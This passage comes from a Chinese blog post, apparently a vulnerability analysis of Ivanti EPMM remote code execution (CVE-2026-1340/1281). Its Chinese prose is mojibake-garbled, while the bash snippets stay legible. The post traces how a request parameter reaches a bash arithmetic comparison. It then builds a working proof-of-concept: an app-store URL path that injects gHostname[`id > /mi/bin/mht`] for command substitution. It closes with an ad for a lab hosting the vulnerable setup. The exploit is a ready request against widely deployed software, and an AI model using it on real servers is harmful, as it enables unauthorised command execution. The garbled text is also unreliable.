<p>æ¾ç¶å¨if [[ ${theCurrentTimeSeconds} -gt ${gStartTime} ]]; åif [[ ${theCurrentTimeSeconds} -lt ${gEndTime} ]] ; ä¸­é½å­å¨è¿ä¸ªæ¡ä»¶ï¼ä½æä»¬ä¹åè¯´äºï¼gStartTimeågEndTimeé½åäºé¿åº¦æ ¡éªçï¼å¿é¡»ä¸ºåä½ï¼è¿å°±å¾é¸¡èäºï¼é£æä¹æ ·æè½ç»è¿è¿ä¸ªé®é¢å¢ï¼</p>
<p>åå°æå¼å§çå®ä¹åéä¸å¾ªç¯ï¼</p>
<pre><code>  if [[ -z ${ret} ]] ; then
    for theKeyMapEntry in "${theAftStoreKeyValueArray[@]}" ; do
      theKey="${theKeyMapEntry%%=*}"
      theValue="${theKeyMapEntry##*=}"
</code></pre>
<p>bashä¸­ä½¿ç¨theKeyåtheValueå¾ªç¯èµå¼ï¼ä¼ åçæåä¸ä¸ªå¼ä¸ºhï¼æä»¥theValueæåçå¼æ¯å°±æ¯hçå¼ï¼é£ç°å¨å°±å¾æææäºï¼gStartTimeågEndTimeé½æé¿åº¦éå¶ï¼ä½hçå¼æ²¡æï¼è½ä¸è½è®©hçå¼èµ°å°if [[ ${theCurrentTimeSeconds} -gt ${gStartTime} ]]; thenéé¢å»åºç¨æ°å¼ç´¢å¼+å½ä»¤æ¿æ¢å¢ï¼</p>
<p>å¯ä»¥çï¼æ¢ç¶å¨bashä¸­æåétheValue=hä¼ åï¼é£æä»¬å°±ç´æ¥è®©gStartTime=theValueï¼æç»æµç¨ï¼å¯æ§håæ°-&gt;theValue-&gt;gStartTimeï¼ç¶åè¿å¥if [[ ${theCurrentTimeSeconds} -gt ${gStartTime} ]];åºç¨æ°å¼ç´¢å¼+å½ä»¤æ¿æ¢ï¼ç°å¨æä»¬å·²ç»æäºRCEçå®æ´é¾æ¡ï¼å¼å§æé æç»pocã</p>
<p>kidåæ°ä¸ºæä»¶è¡æ°ï¼éä¾¿ç¨ä¸ª1ï¼ståæ°ä¸ºtheValueï¼æ³¨æåä½é¿åº¦æ ¡éªï¼æä»¥è¿éè¦åå ä¸¤ä¸ªç©ºæ ¼ï¼etåæ°ä¹åä¸æ¯è¾ï¼ä¹å¯ä½ä¸ºtheValueä¼ åï¼stä¸etéä¾¿ä¸ä¸ªå°æ¹è®¾ç½®ä¸ºtheValueé½å¯ä»¥ï¼æåæ¯håæ°ï¼åªéè¦æ»¡è¶³array[index]å³å¯ã</p>
<p>indexé¨åçåå®¹æäºï¼arrayé¨ååä»ä¹å¢ï¼bashå¼å¤´å¼å¯äºset -o nounsetï¼è¿æ¯ä¸¥æ ¼æ¨¡å¼ï¼ä¸¥æ ¼æ¨¡å¼ä¸ï¼Bash éå°æªå®ä¹çåéä¼ç´æ¥ç»æ­¢èæ¬æ§è¡ï¼ç´æ¥ä»bashå¼å¤´å®ä¹çé£äºç©ºåééé¢éä¸ä¸ªï¼æ¯å¦gPathågHostnameé½å¯ä»¥ï¼æé æç»å¼ï¼</p>
<pre><code>gHostname[`id &gt; /mi/bin/mht`]
</code></pre>
<p>æç»pocï¼</p>
<pre><code>/mifs/c/appstore/fob/3/1120/sha256:kid=1,st=1111111111,et=theValue%20%20,h=gHostname%5B%60id%20&gt;%20/mi/bin/mht%60%5D/mht.ipa
</code></pre>
<p><img alt="" loading="lazy" data-src="https://oss.bdziyi.com/biji/202602021514890.png" class="lazyload"></p>
<p>è¯¥æ¼æ´å¤ç°ç¯å¢å·²å¨æ å¢ä¸­ä¸æ¶ï¼vip.bdziyi.com/ulabï¼æ å¢ï¼è±æåUnbounded Labï¼æ¯ä¸ä¸ºç½ç»å®å¨å­¦ä¹ èæé çç»¼åæ§å®æå¹³å°ï¼æä¾çå®ä¼ä¸çº§æ¼æ´ç¯å¢ï¼è®©æ¨å¨å®å¨çç¯å¢ä¸­æåå®ææè½ï¼æ ¸å¿ç¹è²ï¼ç¬ç«éç¦»ç¯å¢ï¼æ¯ä½ç¨æ·é½æ¥æ<strong>å®å¨ç¬ç«</strong>çé¶åºç¯å¢ï¼å³ä½¿æ¯åºå¤§çåç½é¶åºï¼ç¯å¢ä¹é´ä¹æ¯<strong>é¶å¹²æ°</strong>ï¼ç¡®ä¿æ¨çå­¦ä¹ è¿ç¨ä¸åä»»ä½å½±åã</p>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-02 18:41">2026-02-02 18:41</span>&nbsp;
<a href="https://www.cnblogs.com/mhtsec">å¬ä¼å·æ£è±ç³fans</a>&nbsp;
éè¯»(<span id="post_view_count">35</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19566043);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19566043', targetLink: 'https://www.cnblogs.com/mhtsec/p/19566043', title: 'Ivanti EPMM RCE CVE-2026-1340/1281å®æ´åæ' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
        </channel>
        </rss>